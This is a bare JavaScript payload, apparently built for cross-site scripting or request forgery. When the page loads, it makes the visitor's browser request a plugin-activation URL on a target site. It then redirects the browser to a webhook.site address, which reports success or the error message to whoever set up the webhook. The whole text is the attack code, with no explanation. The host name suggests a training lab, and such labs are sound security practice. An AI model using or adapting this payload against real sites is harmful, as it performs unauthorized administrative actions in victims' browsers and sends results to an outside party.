if(!document.cookie.includes("no-redirect")){
    fetch('http://website-lqrhjc.inst.malicecyber.com/activate-plugin/1')
        .then((e) => {
            document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?plugin-good';
        })
        .catch((e) => {
            document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?plugin-error&error='+e;
        });
}
